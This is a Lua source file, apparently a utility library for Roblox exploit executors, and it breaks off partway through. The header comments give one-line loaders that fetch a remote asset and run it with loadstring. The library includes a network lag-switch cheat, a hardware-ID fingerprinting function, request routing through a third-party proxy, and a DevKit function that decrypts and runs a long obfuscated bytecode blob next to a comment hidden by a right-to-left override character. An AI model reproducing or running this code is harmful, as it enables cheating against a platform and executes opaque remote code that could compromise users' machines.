-- Documentation is NOT provided. Only clues of how this works are in hints (such as this) or in my discord server or DMS Pepsi#5229
-- I am taking on requests to add to my utilites.

-- Loader string
-- local set = getgenv or getfenv;set().Color3, set().Instance, set().math, set().string, set().table, set().Vector3, set().Pepsi, set().Region3, set().Drawing = (function()if Pepsi.Service("RunService"):IsStudio()then return require(0XD3D844D5)end;return loadstring(game:GetObjects[[rbxassetid://3554165973]][0X1].Source)[[Pepsi Was]][[Here]]end)[[Pepsi Utilites]]
-- OR
-- repeat if shared.PepsiUtil then break end t = t or tick()pcall(function()loadstring(game:GetObjects[[rbxassetid://3554165973]][0X1]:GetDescendants()[0X1][([[ToolTip]])])[[Pepsi Utilites]]end)wait(0.1)until true == shared[([[PepsiUtil]])] == true or (tick() - t >= 10 and (function()local t, m = pcall(Instance[([[new]])], [[Message]], game:GetService[[CoreGui]])m[([[Text]])] = [[Pepsi's Utilites failed to load!]]game:GetService[[Debris]]:AddItem(m, 10)return true and error[[Pepsi's Utilites failed to load. Try again later please.]]end)[[Load Failed]])
 --OR
-- auto-update auto-loader (no fail safe)
-- loadstring(game:GetObjects("rbxassetid://3554165973")[0x1]:GetChildren()[0x1].ToolTip)("Pepsi Utilites")

-- getgenv users (super awesome if stuffed in autoexec);
-- getgenv().Color3, getgenv().Instance, getgenv().math, getgenv().string, getgenv().table, getgenv().Vector3, getgenv().Pepsi, getgenv().Region3, getgenv().CFrame, getgenv().Ray, getgenv().Drawing = (function()return loadstring(rawget(game:GetObjects[[rbxassetid://3554165973]], 0X1).Source)[[Pepsi Was]][[Here]]end)[[Pepsi Utilites]]
Pepsi, dbg = Pepsi, dbg	
local _version = "3.96" -- https://api.roblox.com/assets/3554165973/versions
if Pepsi and type(Pepsi) == "table" then
	if type(Pepsi.version) == "string" then
		local nv = tonumber((Pepsi.version:gsub("%D", "")))
		local v = tonumber((_version:gsub("%D", "")))
		if type(nv) == "number" and "number" == type(v) and nv <= v then
			return (function(...) -- Fuck "module can only return 1 result".
				return setmetatable({}, {__index = Color3}), setmetatable({}, {__index = Instance}), setmetatable({}, {__index = math}), setmetatable({rtl = utf8.char(8238)}, {__index = string}), setmetatable({}, {__index = table}), setmetatable({}, {__index = Vector3}), Pepsi, setmetatable({}, {__index = Region3}), setmetatable({}, {__index = CFrame}), setmetatable({}, {__index = Ray})
			end)
		else
			assert(Pepsi and Pepsi.Msg or warn or print)("Attempted to load old/same utilites version: " .. _version)
		end
	end
end
if type(syn) ~= "table" then
	warn("Please consider buying Synapse.")
	warn("Krnl and Sona have been reported working with Pepsi's scripts in the past. Both are free.")
end
if type(shared) ~= "table" then -- HAXOR!@!!
	shared = {has_shitploit = true}
	if getgenv then -- Who the fuck has getgenv but not shared?
		getgenv().shared = {has_shitploit = true}
	end
	if getfenv then
		getfenv().shared = {has_shitploit = true}
	end
end
if not utf8 then
	utf8 = utf8 or setmetatable({}, { -- fuck your damn errors
		__index = function()
			return function()
			end
		end,
		__newindex = function()
			return function()
			end
		end
	})
	if getfenv then
		getfenv().utf8 = utf8
	end
	if getgenv then -- Who the fuck has an exploit that has getgenv, but not utf8?
		getgenv().utf8 = utf8
	end
end
shared.debugfuncs = shared.debugfuncs or false -- Set to true if you want to find out what the utlities is missing (warnings in console)
local auto_exec = not not shared.autoexec or false -- if you set this to true, clone everything in this script. Place in .lua file in workspace/autoexec // UPDATES CUT
local Color3 = setmetatable({}, {__index = Color3}) -- "Table is readonly." - Not anymore
local Instance = setmetatable({}, {__index = Instance})
local math = setmetatable({nan = math.abs(math.huge / math.huge), big = math.huge}, {__index = math})
local string = setmetatable({rtl = utf8.char(8238)}, {__index = string})
local table = setmetatable({}, {__index = table})
local Vector3 = setmetatable({}, {__index = Vector3})
local Region3 = setmetatable({}, {__index = Region3})
local CFrame = setmetatable({}, {__index = CFrame})
local utf8 = setmetatable({rtl = 8238}, {__index = utf8})
local Ray = setmetatable({}, {__index = Ray})
local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" -- For base64
local old_sort = old_sort or table.sort
local old_ins = old_ins or table.insert
local old_new = old_new or Instance.new
local robloxtype = robloxtype or typeof or type -- For those that miss beta api
local Pepsi = {
	Logo = "rbxassetid:\\4427304036", -- Cool stuff (Designed by Rest#9791 [353767887305048064])
	version = tostring(_version or "undefined"),
	Rs = (game:FindService("RunService") or game:GetService("RunService")).RenderStepped,
	Lp = (function()
		return (game:FindService("Players") or game:GetService("Players")).LocalPlayer
	end)(),
	Navigating = false,
	oldgrav = workspace.Gravity,
	Misc = {},
	BodyIds = {},
	isready = false,
	Script = getfenv().script,
	Threads = {},
	Bot = {
		Bots = {} -- WIP
	},
	NetworkSettings = (settings or function()
		function dummyfunc()
			return setmetatable({}, {
				__index = dummyfunc
			})
		end
		return dummyfunc()
	end)().Network,
	Keys = {},
	Server = (type(game.JobId) == "string" and #game.JobId > 30 and game.JobId) or (function()
        while time() < 2 and wait() do
            local id = type(game.JobId) == "string" and #game.JobId > 30 and game.JobId
            if id then
                return id
            end
        end
		local HttpService = game:FindService("HttpService") or game:GetService("HttpService")
		if game.HttpPost then
			return HttpService:JSONDecode(HttpService:JSONDecode(game:HttpPost("https://httpbin.org/post", "")).headers["Roblox-Session-Id"]).GameId
		else
			return HttpService:JSONDecode(HttpService:JSONDecode(HttpService:PostAsync("https://httpbin.org/post", "")).headers["Roblox-Session-Id"]).GameId
		end
	end)(),
	Services = {},
	VarSignals = {},
	Vars = {
		Backpack = false,
		Camera = false,
		CFrame = false,
		Character = false,
		Connect = true,
		Enabled = false,
		Gui = false,
		Head = false,
		Health = false,
		Humanoid = false,
		Tool = false,
		Torso = false,
		Update = game:GetService("RunService").RenderStepped,
		Vector3 = false
	}
}
local newthread = coroutine.create(function(...)
	coroutine.yield() -- Nothing to see here, move along.
end)
function Pepsi.Service(str, display_errors)
	if type(str) ~= "string" or (type(display_errors) ~= "nil" and type(display_errors) ~= "boolean") then
		Pepsi.Arg(str, "string", 1, "Pepsi.Service")
		Pepsi.Arg(display_errors, {"nil", "boolean"}, 2, "Pepsi.Service")
	end
	return Pepsi.Assert((Pepsi.Services[str] or Pepsi.RegisterService(str, display_errors)), "Service '" .. str .. "' not found.", 3)
end
function Pepsi.RegisterService(str, display_errors)
	if type(str) ~= "string" or (type(display_errors) ~= "nil" and type(display_errors) ~= "boolean") then
		Pepsi.Arg(str, "string", 1, "Pepsi.RegisterService")
		Pepsi.Arg(display_errors, {"nil", "boolean"}, 2, "Pepsi.RegisterService")
	end
	local s = rawget(Pepsi.Services, str)
	if not s then
		local e, s = pcall(function()
			return game:FindService(str) or game:GetService(str) or game[str]
		end)
		if display_errors and not e and s then
			warn(s)
		end
		local ss = s or game:FindFirstChild(str)
		if ss then
			rawset(Pepsi.Services, str, ss)
			return ss
		end
	end
	return s
end
function Pepsi.spawn(func, ...)
	if type(func) ~= "function" then
		Pepsi.Arg(func, "function", 1, "Pepsi.spawn")
	end
	return coroutine.wrap(function(...) -- We have to wrap the func in a function (Lua) because coroutine.wrap can't wrap C functions...
		return func(...)
	end)(...)
end
function Pepsi.pspawn(func, ...)
	if type(func) ~= "function" then
		Pepsi.Arg(func, "function", 1, "Pepsi.pspawn")
	end
	return coroutine.wrap(function(...)
		return pcall(func, ...)
	end)(...)
end
function Pepsi.espawn(func, ...)
	if type(func) ~= "function" then
		Pepsi.Arg(func, "function", 1, "Pepsi.espawn")
	end
	return coroutine.wrap(function(...)
		return Pepsi.ecall(func, ...)
	end)(...)
end
function Pepsi.delay(int, func, ...)
	if type(func) ~= "function" or type(int) ~= "number" then
		Pepsi.Arg(int, "number", 1, "Pepsi.delay")
		Pepsi.Arg(func, "function", 2, "Pepsi.delay")
	end
	return coroutine.wrap(function(...) -- We have to wrap the func in a function (Lua) because coroutine.wrap can't wrap C functions...
		wait(int)
		return func(...)
	end)(...)
end
function Pepsi.Debris(item, num, use_debris_service)
	if (type(use_debris_service) ~= "boolean" and type(use_debris_service) ~= "nil") or (type(item) ~= "nil" and typeof(item) ~= "Instance") or (type(num) ~= "nil" or type(num) ~= "number") then
		Pepsi.Arg(item, {"nil", "Instance"}, 1, "Pepsi.Debris")
		Pepsi.Arg(num, {"nil", "number"}, 2, "Pepsi.Debris")
		Pepsi.Arg(use_debris_service, {"nil", "boolean"}, 3, "Pepsi.Debris")
	end
	if item then
		if use_debris_service and item then
			assert(Pepsi.Services.Debris or Pepsi.Service("Debris"), "Debris Missing?"):AddItem(item, num)
		elseif item then
			return delay(num or 10, function()
				if item then
					return item:Destroy()
				end
			end)
		end
	end
end
function Pepsi.gethwid() -- Ty wally
	warn("WARNING! YOUR HWID WAS ACCESSED\n", debug and debug.traceback and debug.traceback())
	if shared.nofingerprint then -- For security, you can disable this function.
		if type(shared.nofingerprint) == "function" then
			return shared.nofingerprint()
		end
		return shared.nofingerprint
	end
	local failsafe = Pepsi.Service("RbxAnalyticsService"):GetClientId()
	local Http = Pepsi.Service("HttpService")
	local JSONDecode = Http.JSONDecode
	local synreq = (type(syn) == "table" and not syn.Compat and type(syn.request) == "function" and syn.request)
	local proreq = (type(http_request) == "function" and http_request)
	local senreq = (type(request) == "function" and SENTINEL_V2 and function(opt)
		return {Body = request("https://httpbin.org/get", "GET", "")}
	end)
	local req = assert(synreq or proreq or senreq or function()
			return {Body = Http:JSONEncode({
				headers = {
					["Exploit-Guid"] = failsafe
				}
			})}
		end, "Platform not supported.")({
		Url = "https://httpbin.org/get",
		Method = "GET"
	})
	local s, data = pcall(JSONDecode, Http, assert(type(req) == "table" and type(req.Body) == "string" and req.Body, "Platform not supported."))
	if s and type(data) == "table" and type(data.headers) == "table" then
		data = data.headers
		return assert(rawget(data, "Syn-Fingerprint") or rawget(data, "Proto-User-Identifier") or rawget(data, "Sentinel-Fingerprint") or rawget(data, "Exploit-Guid") or failsafe, "Platform not supported.")
	end
	return failsafe
end
function Pepsi.DumpFuncs()
	assert(writefile and appendfile)
	local logs = {
		table = true,
		string = true,
		math = true,
		CFrame = true,
		Vector3 = true,
		Instance = true,
		Ray = true,
		Region3 = true,
		Color3 = true,
	}
	writefile("PepsiFuncs.txt", "Pepsi Utilities Version " .. Pepsi.version .. "\n")
	for k, v in pairs(Pepsi) do
		appendfile("PepsiFuncs.txt", "\nPepsi." .. tostring(k) .. "             " .. tostring(v))
	end
	for super in pairs(logs) do
		local stuffs = getrenv()[super]
		local mystuff = getfenv()[super]
		if stuffs and stuffs ~= mystuff and next(mystuff) then
			appendfile("PepsiFuncs.txt", "\n\n")
			for k, v in pairs(mystuff) do
				if nil == stuffs[k] then
					appendfile("PepsiFuncs.txt", "\n" .. super .. "." .. tostring(k) .. "             " .. tostring(v))
				end
			end
		end
	end
end
function Pepsi.NewCharacter(userid, name, walkspeed, jumppower)
	userid = tonumber(userid or 6) or 6
	walkspeed = tonumber(walkspeed or 70) or 70
	jumppower = tonumber(jumppower or 80) or 80
	local p = Pepsi.Service("Players")
	local char = assert(Pepsi.Lp.Character, "No Current Character")
	local d = p:GetHumanoidDescriptionFromUserId(userid)
	local r = p:CreateHumanoidModelFromDescription(d, char:FindFirstChildOfClass("Humanoid").RigType)
	r.Name = p:GetNameFromUserIdAsync(userid)
	local rhuman = r:FindFirstChildOfClass("Humanoid") or r:FindFirstChildWhichIsA("Humanoid", true)
	local scr = {}
	local s = r:FindFirstChild("Animate")
	if s then
		s = s:Destroy()
	end
	for _, obj in pairs(char:GetChildren()) do
		if obj:IsA("LuaSourceContainer") then
			local s = obj:Clone()
			s.Disabled = true
			s.Parent = r
			table.insert(scr, s)
		elseif obj:IsA("Humanoid") then
			for _, val in pairs(obj:GetChildren()) do
				if val:IsA("ValueBase") and rhuman and rhuman:FindFirstChild(val.Name) then
					rhuman:FindFirstChild(val.Name).Value = val.Value
				end
			end
		end
	end
	local myhuman = Pepsi.Lp.Character:FindFirstChildOfClass("Humanoid") or Pepsi.Lp.Character:FindFirstChildWhichIsA("Humanoid", true)
	rhuman.Name = tostring((myhuman and myhuman.Name) or "Humanoid") or "Humanoid"
	r.Parent = Pepsi.Lp.Character.Parent
	delay(0.2, function()
		for _, s in pairs(scr) do
			print(s)
			s.Disabled = false
		end
	end)
	local human = assert(r:FindFirstChildOfClass("Humanoid", true), "No humanoid?")
	human.Died:Connect(function()
		delay(tonumber(p.RespawnTime / 5), function()
			Pepsi.Lp.Character = char
			workspace.CurrentCamera.CameraSubject = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChildWhichIsA("Humanoid", true)
		end)
		Pepsi.Service("Debris"):AddItem((r or Instance.new("Part")), p.RespawnTime)
	end)
	human.WalkSpeed = walkspeed
	human.JumpPower = jumppower
	r:MoveTo(Pepsi.Lp.Character:FindFirstChild("Head").Position)
	Pepsi.Lp.Character = r
	workspace.CurrentCamera.CameraSubject = human or Pepsi.Human()
end
function Pepsi.Date(str_form)
	if type(str_form) ~= "string" and type(str_form) ~= "nil" then
		Pepsi.Arg(str_form, {"string", "nil"}, 1, "Pepsi.Date")
	end
	str_form = tostring(tostring(str_form or "m/d/y") or "m/d/y")
	local d = os.date("*t")
	local map = {
		h = d.hour,
		M = d.min,
		w = d.wday,
		d = d.day,
		m = d.month,
		y = d.year,
		s = d.sec,
		Y = d.yday,
	}
	for t, v in pairs(map) do
		if string.len(tostring(tonumber(v))) == 1 then
			v = "0" .. tostring(v)
		end
		str_form = string.gsub(str_form, t, tostring(v))
	end
	return str_form
end
function Pepsi.Mark(instance, str, state)
	if type(instance) ~= "Instance" or type(str) ~= "string" or (type(state) ~= "boolean" and type(state) ~= "nil") then
		Pepsi.Arg(instance, "Instance", 1, "Pepsi.Mark")
		Pepsi.Arg(str, "string", 2, "Pepsi.Mark")
		Pepsi.Arg(state, {"nil", "boolean"}, 3, "Pepsi.Mark")
	end
	if state ~= nil then
		return Pepsi.Service("CollectionService")[({
			[true] = "AddTag",
			[false] = "RemoveTag"
		})[state]](Pepsi.Service("CollectionService"), instance, str)
	end
	return Pepsi.Service("CollectionService"):AddTag(instance, str)
end
function Pepsi.UnMark(instance, str)
	if type(instance) ~= "Instance" or type(str) ~= "string" then
		Pepsi.Arg(instance, "Instance", 1, "Pepsi.UnMark")
		Pepsi.Arg(str, "string", 2, "Pepsi.UnMark")
	end
	return Pepsi.Service("CollectionService"):RemoveTag(instance, str)
end
function Pepsi.IsMarked(instance, str)
	if type(instance) ~= "Instance" or type(str) ~= "string" then
		Pepsi.Arg(instance, "Instance", 1, "Pepsi.IsMarked")
		Pepsi.Arg(str, "string", 2, "Pepsi.IsMarked")
	end
	return Pepsi.Service("CollectionService"):HasTag(instance, str)
end
function Pepsi.Marks(instance)
	if type(instance) ~= "Instance" then
		Pepsi.Arg(instance, "Instance", 1, "Pepsi.Marks")
	end
	return Pepsi.Service("CollectionService"):GetTags(instance)
end
function Pepsi.GetMarked(str)
	if type(str) ~= "string" then
		Pepsi.Arg(str, "string", 1, "Pepsi.GetMarked")
	end
	return Pepsi.Service("CollectionService"):GetTagged(str)
end
function Pepsi.GetMarkedGroup(str, ...)
	if #({...}) == 0 and type(str) ~= "table" then
		return Pepsi.GetMarked(tostring(v))
	end
	local groups = {}
	for _, data in pairs({str, ...}) do
		for _, v in pairs(data) do
			local u = Pepsi.GetMarked(tostring(v))
			rawset(groups, tostring(v), u)
		end
	end
	return groups or {}
end
function Pepsi.GetMarkedRaw(str, ...)
	local groups = Pepsi.GetMarkedGroup(str, ...) or {}
	local master = {}
	for _, v in pairs(groups) do
		if type(v) == "table" then
			for _, c in pairs(v) do
				table.insert(master, c)
			end
		elseif type(v) ~= "nil" then -- How the fuck did this happen? Well, best not chance it.
			table.insert(master, v)
		end
	end
	return (master or groups or {}), groups or {}
end
function Pepsi.GetFirstTagged(str)
	local tagged = Pepsi.GetMarked(str)
	if #tagged > 0 then
		return rawget(tagged, 1)
	end
end
function Pepsi.GetFirstTaggedByGroup(...)
	for _, data in pairs({...}) do
		if type(data) == "string" then
			local tag = Pepsi.GetFirstTagged(data)
			if tag then
				return tag
			end
		elseif type(data) == "table" then
			for _, data in pairs(data) do
				local tag = Pepsi.GetFirstTagged(tostring(data))
				if tag then
					return tag
				end
			end
		end
	end
end
function Pepsi.ConnectMark(str, method)
	if type(str) ~= "string" or (type(method) ~= "boolean" and type(method) ~= "nil") then
		Pepsi.Arg(str, "string", 1, "Pepsi.ConnectMark")
		Pepsi.Arg(method, {"boolean", "nil"}, 2, "Pepsi.ConnectMark")
	end
	local c = ({
		[true] = {add = true},
		[false] = {rem = true},
		["nil"] = {add = true, rem = true}
	})[(type(method) == "nil" and "nil" or method)]
	local b = Instance.make("BindableEvent", {Name = str})
	for op, val in pairs(c) do
		if c.add then
			Pepsi.Assert(b and Pepsi.Service("CollectionService"):GetInstanceAddedSignal(str), "Failed to make bind.", 3):Connect(function(ins)
				b:Fire(ins, true)
			end)
		end
		if c.rem then
			Pepsi.Assert(b and Pepsi.Service("CollectionService"):GetInstanceRemovedSignal(str), "Failed to make bind.", 3):Connect(function(ins)
				b:Fire(ins, false)
			end)
		end
	end
	return b
end
function Pepsi.LagSwitch(bool, scale)
	if bool == nil then
		bool = not Pepsi.Lagging
	elseif type(bool) ~= "boolean" then
		Pepsi.Arg(bool, {"boolean", "nil"}, 1, "Pepsi.LagSwitch")
	end
	if not scale then
		scale = 9e9
	elseif type(scale) ~= "number" then
		Pepsi.Arg(scale, {"number", "nil"}, 2, "Pepsi.LagSwitch")
	end
	Pepsi.Lagging, Pepsi.LagScale = bool, scale
	if not Pepsi.NetworkSettings then
		Pepsi.NetworkSettings = settings().Network
	end
	Pepsi.xpcall(function()
		while wait() and Pepsi.Lagging and Pepsi.LagScale do
			Pepsi.NetworkSettings.IncomingReplicationLag = Pepsi.LagScale
		end
	end, warn)
	Pepsi.NetworkSettings.IncomingReplicationLag = 0
end
function Pepsi.PathStr(ins, legends)
	if not ins or typeof(ins) ~= "Instance" or (legends and type(legends) ~= "table") then
		Pepsi.Arg(ins, {"Instance"}, 1, "Pepsi.PathStr")
		Pepsi.Arg(legends, {"nil", "table"}, 2, "Pepsi.PathStr")
	end
	legends = legends or {
		["\\"] = "\\\\",
		["\a"] = "\\a",
		["\b"] = "\\b",
		["\f"] = "\\f",
		["\n"] = "\\n",
		["\r"] = "\\r",
		["\t"] = "\\t",
		["\v"] = "\\v",
		["\""] = "\\\"",
		[" "] = " "
	}
	local int, parent, str, parents = 0, ins, "", {}
	while parent do
		int = 1 + int
		table.insert(parents, {int, parent})
		parent = parent.Parent
	end
	table.sort(parents, function(a, b)
		return a[1] > b[1]
	end)
	local do_add = false
	if parents[1] and parents[2] and parents[1][2] == game and parents[2][2] == workspace then
		do_add = table.remove(parents, 1)
	end
	local proceed, data = next(parents)
	local name = (data[2] == game and "game") or (data[2] == workspace and "workspace") or data[2].Name
	local parsedname = string.gsub(name, "%W", function(c)
		return legends[c] or ("\\" .. tostring(string.byte(c)))
	end)
	if do_add then
		table.insert(parents, 1, do_add)
	end
	local cond = true--(do_add and table.getn(parents) == 2) or table.getn(parents) == 1
	str = ((tonumber(string.sub(name, 1, 1)) or string.find(name, "%W")) and ((cond and "NIL") or "") .. "[\"" .. parsedname .. "\"]") or ((cond and "NIL.") or "") .. parsedname
	if do_add then
		table.remove(parents, 1)
	end
	table.remove(parents, 1)
	proceed, data = next(parents)
	while proceed do
		local name = (data[2] == game and "game") or (data[2] == workspace and "workspace") or data[2].Name
		local parsedname = string.gsub(name, "%W", function(c)
			return legends[c] or ("\\" .. tostring(string.byte(c)))
		end)
		str = str .. ((str == "game" and pcall(game.GetService, game, data[2].ClassName) and (":GetService(\"" .. parsedname .. "\")")) or ((tonumber(string.sub(name, 1, 1)) or string.find(name, "%W")) and "[\"" .. parsedname .. "\"]") or ("." .. parsedname)) -- wussy units.
		table.remove(parents, 1)
		proceed, data = next(parents)
	end
	return ((string.sub(str, 1, 13) == "NIL.workspace" or string.sub(str, 1, 8) == "NIL.game") and string.sub(str, 5)) or str
end
function Pepsi.CopyPos(noclipboard, cf)
	local v = Pepsi.Pos()
	local s = tostring(((cf and "CFrame.new(") or "Vector3.new(") .. tostring(math.round(v.X)) .. ", " .. tostring(math.round(v.Y)) .. ", " .. tostring(math.round(v.Z)) .. ")")
	if not noclipboard then
		setclipboard(s)
	end
	return s
end
function Pepsi.Tool(loser)
	loser = loser or Pepsi.Me()
	if typeof(loser) ~= "Instance" or loser.ClassName ~= "Player" then
		Pepsi.Arg(loser, "Player", 1, "Pepsi.Tool")
	end
	local c = Pepsi.Char(loser)
	if c then
		return c:FindFirstChildWhichIsA("BackpackItem")
	end
end
function Pepsi.xpcall(func, func2, ...)
	if type(func) ~= "function" or type(func2) ~= "function" then
		Pepsi.Arg(func, "function", 1, "Pepsi.xpcall")
		Pepsi.Arg(func2, "function", 2, "Pepsi.xpcall")
	end
	local ret = {
		pcall(func, ...)
	}
	local suc = table.remove(ret, 1)
	local msg = table.remove(ret, 1)
	if not suc and msg then
		return func2(msg)
	end
	return suc, msg, unpack(ret)
end
function Pepsi.Ressert(statement, msg, yes, no) -- Assert with extra features
	if type(msg) ~= "string" and type(msg) ~= "nil" then
		Pepsi.Arg(msg, {"nil", "string"}, 2, "Pepsi.Ressert")
	end
	msg = tostring(msg or "ressertion failed!")
	if not statement then
		Pepsi.TraceError(tostring(msg))
		return no
	elseif yes ~= nil then
		return yes
	end
	return statement
end
function Pepsi.GetLimbs(loser)
	local limbs, hum = {}, nil
	if typeof(loser) == "Instance" then
		if loser:IsA("Player") then
			loser = loser.Character
			if not loser then
				return {}
			end
		elseif loser:IsA("Humanoid") then
			loser, hum = loser.Parent, loser
			if loser == workspace then
				return {}
			end
		end
		if typeof(loser) == "Instance" and (hum or loser:FindFirstChildOfClass("Humanoid")) then
			hum = (typeof(hum) == "Instance" and hum:IsA("Humanoid") and hum) or loser:FindFirstChildOfClass("Humanoid")
			for _, limb in pairs(loser:GetChildren()) do
				pcall(function()
					if pcall(hum.GetLimb, hum, limb) then
						table.insert(limbs, limb)
					end
				end)
			end
		end
	end
	return limbs or {}
end
function Pepsi.require(id)
	if typeof(id) == "Instance" and id.ClassName == "ModuleScript" then
		if type(dbg.ums) == "function" then
			pcall(dbg.ums, id)
		end
		return require(id)
	elseif type(id) == "number" or type(id) == "string" then
		return Pepsi.LoadAsset(string.num(id))
	end
	return {"Error"}
end
function Pepsi.TraceError(msg)
	return Pepsi.ErrorMsg(tostring(msg) .. "\n" .. debug.traceback():gsub("[^\r\n]+", function(c) 
		return string.rep(" ", 4) .. c
	end))
end
function Pepsi.GenerateError(msg)
	return tostring(tostring(msg) .. "\n" .. debug.traceback():gsub("[^\r\n]+", function(c) 
		return string.rep(" ", 4) .. c
	end))
end
function Pepsi.Post(url, data, headers, copy_link)
	if type(url) ~= "string" or (type(headers) ~= "string" and type(headers) ~= "nil") or (type(data) ~= "string" and type(data) ~= "table") then
		Pepsi.Arg(url, "string", 1, "Pepsi.Post")
		Pepsi.Arg(data, {"table", "string"}, 2, "Pepsi.Post")
		Pepsi.Arg(headers, {"nil", "string"}, 3, "Pepsi.Post")
	end
	if type(data) == "table" then
		data = table.tojson(data)
	end
	headers = headers or "Content-type:application/json"
	local http = Pepsi.Service("HttpService")
	local s, res = pcall(function()
		local r, finished = {}, Instance.new("BindableEvent")
		local hed = tostring((header and "&header=" .. http:UrlEncode(header)) or "")
		local links = "http://postget.ga/?url=" .. http:UrlEncode(url) .. "&data=" .. http:UrlEncode(data) .. hed
		if not not copy_link then
			setclipboard(links)
		end
		http:RequestInternal({
			Url = links
		}):Start(function(tru, done)
			return finished:Fire(done)
		end)
		r = finished.Event:Wait()
		finished:Destroy()
		return r and r.Body
	end)
	if not s or type(res) ~= "string" then
		s, res = pcall(function()
			return Pepsi.Service("HttpService"):PostAsync(url, data)
		end)
		if not s or type(res) ~= "string" then
			s, res = pcall(function()
				if game.HttpPost then
					return game:HttpPost(url, data)
				end
			end)
		end
	end
	return res
end
function Pepsi.DevKit(...) -- Pepsi's tool set
	--if (Pepsi.Lp or Pepsi.Me()).UserId == 818731954 then -- Tired of having to add alt id's
	--[[â€®]]return pcall(Pepsi.LoadByteCode(Pepsi.DecryptSimple("@$Y(Ig[sUQb9qVWup:N}ei8{x6-LL>o>Py2N1I*KH(1wKRLhs$q*=xzFl*gI&aT.c{dD@zKX7vjQCTrn=0-6=yP@hGtr0[jnK7O2%6nqkh3R?^K9}SgkOYJYAGW<WDSL%spwsnOKSM>ga=4w?x.A?Ne^t*l2fa(r-RF[Wy*TW(1=4Gpzwko9*[+Pae0f+i{i&-K5K+Ki?Q1[i!PCFWNp@P3@O@c$13pC$5lMCUnRj8gCP?BK6?RYU=6VZD&/ke6K=]>x@D#+zhPcM0@BL3C^$#$m0aqEsBu?.8hYSUf1{uqx/%?)h[dvokxakZ4W>eh+D0j{)M+Ux=TLASHUj[ytSwG@j/@nd1bqwRmZ8?=}*2/A?!JU6f<7oBBx{jM.4%qjz.jO$Y-@p!=ZtT[oYQB$:-zFi!(XcEcn@*q.OrJjR3ZtK9y3v)rh#WqA[FEd/@ja@]5FjHE/(+5E].nfMfjaZ2xMSyBrMsHwW>pWqYYncS/pvAGHSzvKp:uxY6#Aaz]R:ifZ#fnX@.dEz&^$RJ{V^QWonlx]Taw/<coKGWm*bZ@9H09gd.im]r-2Hl::4ikO0vmgRO^wyV&:Y+}]Iy8z&EQdmmiwEtg2NwA$h:(lF$-KCPK&{N0vqF}W2dEL2.3zr3e.US??z2gpz/X]vsi].9tc6po/1$HmyH2esgjE]f2We:ui7IYQZS{*(gBDXLhW!N5oZhId6*-HTsz@iSEf!XvQTwfzAXRMaM*+em:>&tj6r{}2Tu2CR04&}B)K:BEaJ[DZ=?m^6]m[4NFt)gdytIsVj>W[M6oH[8I#%J![oJCy]:T&vcJGxx!JgI7-CXX5($kf@5mke)8D$3yp(7p<qD7bCixyXFaMZ./hl+=FhwjnNvMwHqiz680o0*sm7YKdl>A4q1#4u}@bJN-rO!YLc#Q@6k%sPK=0NyAbP6U5V$syJa6z8H=mzeB+6RUyihzSVTnKgI%=-OytY?]z.YqrG#VD^k#{7*VPtx)RTwIXCaLQc*wvid<-P=@t3Yy[IMaROE<eo*7<HyhO1HBoY1mm69^hYJzgNgSAV-Ki%$$-S*Q>Zo0pY}i>DzyQqGEVcx}yP#w<[Mh-4UOoVAv#J(vfmIk*%):Nd@C8*:.nqr.]2}vLgDIAY)pxG677W+6M^AUH<Mc6yjn<xfAK)DzSc(joU.gJ6:S72]h(l^C6i)ci=yGxx?:[ry1Q3{kdm9oeM07AQL(wLB-Bnr@c0nlm5=AU[XTMixre!7ShIIR?B+=[QJhOlf.Eb)Y{?3!:+R{0fjGOy/<FNDj:r(<5pU<&tJW*vrGI9dN&7<(#$:1U0iZ7X9Rjf)xsaCr%^PCx<7Ae9R:@jfiVWLB]nBd?DL^Q+tB$rNMaz/v}<@+rtsB=Z4U+U6/9gfY-nZgPwQ+2Cm/T^4z9n1?sS[WGfjh.c2Zcvf.BSEO:TNupp&pcpBtUIwS4skN3bT#-czu}(1EWlxWqmI!@jMC@u4Ieq2P5<v<7b=?$i9&i&xC>/mJTUGVfKDnMj&kI9+s^{bf%BnOC.]e7=bcilE)^Ehc>vUP%s6ZXWi(DO^5A+8IqW32>Iv8R9rn1lf=AtRVw*oE>d2Rm.3A6>/%&ty(!{(qc87NV{HZPgz5wJw{d8uoT0LAXoCCW$5$DWPx#Vol]ApXuaomFicb8}bQ%SzN&r+NiVh(xVqs%>.bkE@<gHL&zY>u2wLdn=9HEj*8{f6:FMGbRnkQWbx$Uo0:3-=VjZqE=o{/kcsnZnZuHFiHm3vCpCzLF=g:E@Z4mHW8(M^oVxr3zs8ut6[7No4iFt0vC!vc3l}CyQC$n5<hlyHsXk0!cMg$)Lm2?lgg]j<8@5&nkJ/*=&-YxVf2+#=(ozf?OdNzzvz2a7uJu/>=BiQW&=prZGWtL@=Qb<Gk0#lFE}M]yJ.BPYuW*>TbD-bZVQ&pbaynzn:P]pS*T0j!@G=Kk%7puKH.#(^M<d0/DtRmnXt*bpw.ROBqIvr:Va(m8{Vl32HJP^W>0$Ah2LJGBIC5WDs)dYT&1[O<7d?)Q>(bJ>(7BFBDCnn94a#1OCk*xegya9mSw}0w!f:(SyNGtlMjHkQ<7J5kc*PU+U>+/oTd08{cO(+{J!7:0t!Ep4Fp]vnEjvVk<*!8d[n=CLn:c>p&F6qPSdSJoJBBNyDyqIA[}xOc.}XZ7rZWW?Y/YC6IfUp=&n!55dqIH%(RJ1Xrz0<Qu^99%H8Q>tfhM[GD@H#4-+kd6a-/pRU*Czm7ypHCkhH06ri.eoKhrj+E00KzF:^rT[vZLYUP-fnv+V8E]ECLbAfRcl=V8sKd!0bZBM*KU*29Ei-+l/^I>H>jAHt!3./EsM5H2=w{J(xo(JG6V*nQQ<f}73t(r@x^j>1[J>:vu}..kfocnKp*h3Ad{RFs-A8kb2{Nfq7fb]xQh0?A^Gwm9iD.7?kiD?E?jw-%Ftx]poJ0pH7L^-/&&CxmTe3<I$4DsdHF#bn^ubfm1^Pf]?mi2xaNuC}M#vm^[=sWMR$Z?P?WaCgN.H!@CH/4vdTaV<xy&9b>fW3P{kL6e=uc2!/N)x<^e+5QiwVQrv%lSJE]p6jC[!5t-UA7)WO)vUDx6s)VprDb/7b3690V0Kswsf{8#8Bv8<sMW8cg56c8ns$NZ:>ieZ)v+Yz.L+YMv+l=LCTC!rFd5#&Ub6s-RFv%#cb$1P9w{%{J.EBdzamezPP2K42dtM7(W*Igm).zos{1[27fY2UVq/7f=&8[IL9:ikQTWEX/&./6&g!l@n1svPYQtAQP(Q0VR@JqfO^Dr}Go7CypYzQC/T